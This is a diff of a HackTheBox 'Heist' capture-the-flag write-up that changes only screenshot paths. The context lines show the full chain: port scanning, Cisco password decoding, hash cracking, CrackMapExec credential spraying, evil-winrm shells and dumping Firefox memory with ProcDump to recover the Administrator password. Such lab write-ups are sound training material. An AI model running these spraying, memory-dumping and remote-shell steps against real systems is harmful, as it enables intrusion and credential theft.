@@ -42,7 +42,7 @@ Check if the host is alive using ICMP:
 ```bash
 ping -c 1 10.10.10.149
 ```
-![ping](cases/HackTheBox/Machines/EASY/Heist/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -63,7 +63,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.149 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allports](cases/HackTheBox/Machines/EASY/Heist/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -71,7 +71,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Heist/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -87,7 +87,7 @@ nmap -p80,135,445,5985,49669 -sC -sV 10.10.10.149 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-![targeted](cases/HackTheBox/Machines/EASY/Heist/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -113,11 +113,11 @@ Continue the attack chain with the next commands:
 whatweb http://10.10.10.149
 ```
 
-![whatweb](cases/HackTheBox/Machines/EASY/Heist/screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 The site redirects to a `login.php` page.
 
-![web_login](cases/HackTheBox/Machines/EASY/Heist/screenshots/web_login.png)
+![web_login](screenshots/web_login.png)
 
 ### 2.2 Guest Access
 
@@ -127,7 +127,7 @@ The application allows guest login. Confirm the login surface responds before pu
 curl -s -o /dev/null -w "%{http_code}\n" http://10.10.10.149/login.php
 ```
 
-![web_guest](cases/HackTheBox/Machines/EASY/Heist/screenshots/web_guest.png)
+![web_guest](screenshots/web_guest.png)
 
 We see potential usernames:
 
@@ -136,7 +136,7 @@ We see potential usernames:
 
 A Cisco router configuration is attached:
 
-![web_attachment](cases/HackTheBox/Machines/EASY/Heist/screenshots/web_attachment.png)
+![web_attachment](screenshots/web_attachment.png)
 
 ---
 ## 3. Foothold
@@ -154,15 +154,15 @@ Using an [online decoder](https://www.ifm.net.nz/cookbooks/passwordcracker.html)
 echo "0242114B0E143F015F5D1E161713"
 ```
 
-![cisco_password_crack_rout3r](cases/HackTheBox/Machines/EASY/Heist/screenshots/cisco_password_crack_rout3r.png)
-![cisco_password_crack_admin](cases/HackTheBox/Machines/EASY/Heist/screenshots/cisco_password_crack_admin.png)
+![cisco_password_crack_rout3r](screenshots/cisco_password_crack_rout3r.png)
+![cisco_password_crack_admin](screenshots/cisco_password_crack_admin.png)
 
 Decrypted:
 
 - **rout3r** â†’ `$uperP@ssword`  
 - **admin** â†’ `Q4)sJu\Y8qz*A3?d`  
 
-![credentials](cases/HackTheBox/Machines/EASY/Heist/screenshots/credentials.png)
+![credentials](screenshots/credentials.png)
 
 We store them for later testing.
 
@@ -180,11 +180,11 @@ Cracked with John:
 john -w:$(locate rockyou.txt | tail -n 1) hash.txt
 ```
 
-![john_hash](cases/HackTheBox/Machines/EASY/Heist/screenshots/john_hash.png)
+![john_hash](screenshots/john_hash.png)
 
 Recovered password: **stealth1agent**
 
-![passwords](cases/HackTheBox/Machines/EASY/Heist/screenshots/passwords.png)
+![passwords](screenshots/passwords.png)
 
 ### 3.3 CrackMapExec Attempts
 
@@ -194,7 +194,7 @@ We combine users and passwords:
 crackmapexec smb 10.10.10.149 -u users.txt -p passwds.txt --continue-on-success
 ```
 
-![crackmapexec_smb_hazard](cases/HackTheBox/Machines/EASY/Heist/screenshots/crackmapexec_smb_hazard.png)
+![crackmapexec_smb_hazard](screenshots/crackmapexec_smb_hazard.png)
 
 User **Hazard** is valid with password `stealth1agent`.
 
@@ -203,7 +203,7 @@ User **Hazard** is valid with password `stealth1agent`.
 crackmapexec winrm 10.10.10.149 -u 'hazard' -p 'stealth1agent'
 ```
 
-![crackmapexec_winrm_hazard](cases/HackTheBox/Machines/EASY/Heist/screenshots/crackmapexec_winrm_hazard.png)
+![crackmapexec_winrm_hazard](screenshots/crackmapexec_winrm_hazard.png)
 
 The account does not belong to the **Remote Management Users** group, so we cannot use WinRM at this stage.  
 Next, we attempt to enumerate resources with `rpcclient` and `smbmap`:
@@ -213,7 +213,7 @@ rpcclient -U "hazard%stealth1agent" 10.10.10.149 -c 'enumdomusers'
 smbmap -H 10.10.11.174 -u 'hazard%stealth1agent'
 ```
 
-![smbmap_rpcclient_NOK](cases/HackTheBox/Machines/EASY/Heist/screenshots/smbmap_rpcclient_NOK.png)
+![smbmap_rpcclient_NOK](screenshots/smbmap_rpcclient_NOK.png)
 
 No useful information is retrieved.  
 
@@ -232,14 +232,14 @@ We can list all users on the system:
 lookupsid.py SUPPORTDESK/hazard:stealth1agent@10.10.10.149
 ```
 
-![lookupsid](cases/HackTheBox/Machines/EASY/Heist/screenshots/lookupsid.png)
+![lookupsid](screenshots/lookupsid.png)
 
 We discover additional users and update our wordlist:  
 
 
 Continue the attack chain with the next commands:
 
-![users_updated](cases/HackTheBox/Machines/EASY/Heist/screenshots/users_updated.png)
+![users_updated](screenshots/users_updated.png)
 
 ### 3.5 Credential Spraying
 
@@ -249,7 +249,7 @@ Spray updated domain users against the recovered password material:
 crackmapexec smb 10.10.10.149 -u users.txt -p passwds.txt --continue-on-success
 ```
 
-![crackmapexec_smb_chase](cases/HackTheBox/Machines/EASY/Heist/screenshots/crackmapexec_smb_chase.png)
+![crackmapexec_smb_chase](screenshots/crackmapexec_smb_chase.png)
 
 New valid user: **Chase**
 
@@ -259,7 +259,7 @@ Check WinRM access:
 crackmapexec winrm 10.10.10.149 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'
 ```
 
-![crackmapexec_winrm_chase](cases/HackTheBox/Machines/EASY/Heist/screenshots/crackmapexec_winrm_chase.png)
+![crackmapexec_winrm_chase](screenshots/crackmapexec_winrm_chase.png)
 
 Access confirmed.
 
@@ -271,7 +271,7 @@ Open a **WinRM** session using the confirmed **Chase** credentials:
 evil-winrm -i 10.10.10.149 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'
 ```
 
-![user_flag](cases/HackTheBox/Machines/EASY/Heist/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ðŸ **User flag obtained**
 
@@ -283,7 +283,7 @@ Inspect the session token, groups, and privilege constants:
 whoami /all
 ```
 
-![chase_whoami_all](cases/HackTheBox/Machines/EASY/Heist/screenshots/chase_whoami_all.png)
+![chase_whoami_all](screenshots/chase_whoami_all.png)
 
 No exploitable privileges found.
 
@@ -298,7 +298,7 @@ List processes to spot suspicious long-lived applications (e.g. browsers):
 ps
 ```
 
-![chase_ps](cases/HackTheBox/Machines/EASY/Heist/screenshots/chase_ps.png)
+![chase_ps](screenshots/chase_ps.png)
 
 Suspiciously high number of Firefox processes.
 
@@ -306,7 +306,7 @@ Suspiciously high number of Firefox processes.
 ps | findstr firefox
 ```
 
-![chase_ps_firefox](cases/HackTheBox/Machines/EASY/Heist/screenshots/chase_ps_firefox.png)
+![chase_ps_firefox](screenshots/chase_ps_firefox.png)
 
 ### 4.2 Dumping Firefox Process
 
@@ -316,7 +316,7 @@ Upload Sysinternals ProcDump:
 upload /home/kali/Documents/Machines/Heist/content/procdump64.exe
 ```
 
-![chase_upload_procdump64](cases/HackTheBox/Machines/EASY/Heist/screenshots/chase_upload_procdump64.png)
+![chase_upload_procdump64](screenshots/chase_upload_procdump64.png)
 
 Dump Firefox process:
 
@@ -324,7 +324,7 @@ Dump Firefox process:
 .\procdump64.exe -accepteula -ma 6356
 ```
 
-![chase_execute_procdump64](cases/HackTheBox/Machines/EASY/Heist/screenshots/chase_execute_procdump64.png)
+![chase_execute_procdump64](screenshots/chase_execute_procdump64.png)
 
 Download the dump:
 
@@ -343,7 +343,7 @@ Search `password` on dump file:
 strings firefox.dmp | grep password
 ```
 
-![dump_password](cases/HackTheBox/Machines/EASY/Heist/screenshots/dump_password.png)
+![dump_password](screenshots/dump_password.png)
 
 Recovered credentials:
 
@@ -357,7 +357,7 @@ Validate credentials:
 crackmapexec smb 10.10.10.149 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
 ```
 
-![crackmapexec_smb_admin](cases/HackTheBox/Machines/EASY/Heist/screenshots/crackmapexec_smb_admin.png)
+![crackmapexec_smb_admin](screenshots/crackmapexec_smb_admin.png)
 
 Obtain shell:
 
@@ -365,7 +365,7 @@ Obtain shell:
 evil-winrm -i 10.10.10.149 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
 ```
 
-![root_flag](cases/HackTheBox/Machines/EASY/Heist/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ðŸ **Root flag obtained**
 
